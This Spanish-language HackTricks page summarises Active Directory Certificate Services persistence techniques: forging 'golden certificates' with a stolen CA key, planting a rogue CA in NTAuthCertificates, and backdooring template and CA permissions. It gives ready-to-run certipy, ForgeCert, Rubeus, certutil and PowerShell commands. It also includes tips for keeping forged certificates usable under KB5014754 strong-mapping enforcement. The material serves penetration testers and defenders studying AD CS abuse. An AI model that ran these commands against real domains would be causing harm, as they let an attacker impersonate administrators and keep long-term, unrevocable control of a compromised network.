# Persistencia de dominio de AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Esto es un resumen de las técnicas de persistencia de dominio compartidas en [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consúltalo para más detalles.

## Forjar certificados con certificados de CA robados (Golden Certificate) - DPERSIST1

¿Cómo puedes saber que un certificado es un certificado de CA?

Se puede determinar que un certificado es un certificado de CA si se cumplen varias condiciones:

- El certificado está almacenado en el servidor CA, con su clave privada protegida por el DPAPI de la máquina, o por hardware como un TPM/HSM si el sistema operativo lo soporta.
- Los campos Issuer y Subject del certificado coinciden con el nombre distinguido de la CA.
- Una extensión "CA Version" está presente exclusivamente en los certificados de CA.
- El certificado carece de campos Extended Key Usage (EKU).

Para extraer la clave privada de este certificado, la herramienta `certsrv.msc` en el servidor CA es el método soportado a través de la GUI integrada. Sin embargo, este certificado no difiere de otros almacenados en el sistema; por lo tanto, pueden aplicarse métodos como la [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) para su extracción.

El certificado y la clave privada también pueden obtenerse usando Certipy con el siguiente comando:
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Tras adquirir el certificado de CA y su clave privada en formato `.pfx`, se pueden utilizar herramientas como [ForgeCert](https://github.com/GhostPack/ForgeCert) para generar certificados válidos:
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> El usuario objetivo para la falsificación de certificados debe estar activo y ser capaz de autenticarse en Active Directory para que el proceso tenga éxito. Falsificar un certificado para cuentas especiales como krbtgt es ineficaz.

Este certificado forjado será **válido** hasta la fecha de expiración especificada y mientras el certificado CA raíz sea válido (normalmente de 5 a **10+ años**). También es válido para **máquinas**, por lo que combinado con **S4U2Self**, un atacante puede **mantener persistencia en cualquier máquina del dominio** durante todo el período en que el certificado CA sea válido.\
Además, los **certificados generados** con este método **no pueden ser revocados** porque la CA no es consciente de ellos.

### Operando bajo Strong Certificate Mapping Enforcement (2025+)

Desde el 11 de febrero de 2025 (después del despliegue de KB5014754), los controladores de dominio tienen por defecto **Full Enforcement** para los mapeos de certificados. En la práctica esto significa que tus certificados forjados deben:

- Contener una vinculación fuerte con la cuenta objetivo (por ejemplo, la extensión de seguridad SID), o
- Estar emparejados con un mapeo fuerte y explícito en el atributo `altSecurityIdentities` del objeto objetivo.

Un enfoque fiable para la persistencia es generar un certificado forjado encadenado a la Enterprise CA robada y luego añadir un mapeo fuerte y explícito al principal de la víctima:
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notas
- Si puedes crear certificados forjados que incluyan la extensión de seguridad SID, éstos se mapearán implícitamente incluso bajo Full Enforcement. De lo contrario, prefiere mapeos explícitos y sólidos. Véase [account-persistence](account-persistence.md) para más sobre mapeos explícitos.
- La revocación no ayuda a los defensores aquí: los certificados forjados son desconocidos para la base de datos de CA y, por lo tanto, no pueden ser revocados.

## Confiar en certificados CA maliciosos - DPERSIST2

El objeto `NTAuthCertificates` está definido para contener uno o más **CA certificates** dentro de su atributo `cacertificate`, que utiliza Active Directory (AD). El proceso de verificación por parte del **domain controller** consiste en comprobar el objeto `NTAuthCertificates` en busca de una entrada que coincida con la **CA specified** en el campo Issuer del **certificate** que está autenticando. La autenticación procede si se encuentra una coincidencia.

Un certificado CA auto-firmado puede añadirse al objeto `NTAuthCertificates` por un atacante, siempre que tenga control sobre este objeto de AD. Normalmente, solo los miembros del grupo **Enterprise Admin**, junto con **Domain Admins** o **Administrators** en el **forest root’s domain**, tienen permiso para modificar este objeto. Pueden editar el objeto `NTAuthCertificates` usando `certutil.exe` con el comando `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, o empleando la [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Comandos adicionales útiles para esta técnica:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Esta capacidad es especialmente relevante cuando se usa junto con un método descrito anteriormente que implica ForgeCert para generar certificados dinámicamente.

> Post-2025 mapping considerations: placing a rogue CA in NTAuth only establishes trust in the issuing CA. To use leaf certificates for logon when DCs are in **Full Enforcement**, the leaf must either contain the SID security extension or there must be a strong explicit mapping on the target object (for example, Issuer+Serial in `altSecurityIdentities`). See {{#ref}}account-persistence.md{{#endref}}.

## Configuración maliciosa - DPERSIST3

Las oportunidades para **persistence** mediante **modificaciones de security descriptor de AD CS** son abundantes. Las modificaciones descritas en la sección "[Domain Escalation](domain-escalation.md)" pueden ser implementadas maliciosamente por un atacante con acceso elevado. Esto incluye la adición de "control rights" (p. ej., WriteOwner/WriteDACL/etc.) a componentes sensibles como:

- El objeto **computer** de AD del servidor **CA**
- El servidor **RPC/DCOM** del servidor **CA**
- Cualquier **objeto o contenedor AD descendiente** en **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (por ejemplo, el contenedor Certificate Templates, el contenedor Certification Authorities, el objeto NTAuthCertificates, etc.)
- **Grupos AD delegados con derechos para controlar AD CS** por defecto o por la organización (como el grupo incorporado Cert Publishers y cualquiera de sus miembros)

Un ejemplo de implementación maliciosa implicaría que un atacante, que posee **permisos elevados** en el dominio, añada el permiso **`WriteOwner`** a la plantilla de certificado por defecto **`User`**, siendo el atacante el principal para ese derecho. Para explotar esto, el atacante primero cambiaría la propiedad de la plantilla **`User`** a sí mismo. A continuación, la **`mspki-certificate-name-flag`** se establecería en **1** en la plantilla para habilitar **`ENROLLEE_SUPPLIES_SUBJECT`**, permitiendo que un usuario proporcione un Subject Alternative Name en la solicitud. Posteriormente, el atacante podría **enroll** usando la **template**, eligiendo un nombre de **domain administrator** como nombre alternativo, y utilizar el certificado obtenido para autenticarse como DA.

Controles prácticos que los atacantes pueden configurar para persistencia a largo plazo en el dominio (ver {{#ref}}domain-escalation.md{{#endref}} para detalles completos y detección):

- Flags de política de la CA que permiten SAN desde los solicitantes (p. ej., habilitar `EDITF_ATTRIBUTESUBJECTALTNAME2`). Esto mantiene rutas explotables similares a ESC1.
- DACL de la template o configuraciones que permitan emisión con capacidad de autenticación (p. ej., añadir Client Authentication EKU, habilitar `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Controlar el objeto `NTAuthCertificates` o los contenedores de la CA para reintroducir continuamente emisores rogue si los defensores intentan limpiar.

> [!TIP]
> En entornos hardened después de KB5014754, emparejar estas malas configuraciones con mapeos explícitos y fuertes (`altSecurityIdentities`) asegura que tus certificados emitidos o forjados sigan siendo utilizables incluso cuando los DCs aplican strong mapping.

## References

- Microsoft KB5014754 – Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Command Reference and forge/auth usage. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- [0xdf – HTB: Certificate (SeManageVolumePrivilege to exfil CA keys → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../../banners/hacktricks-training.md}}
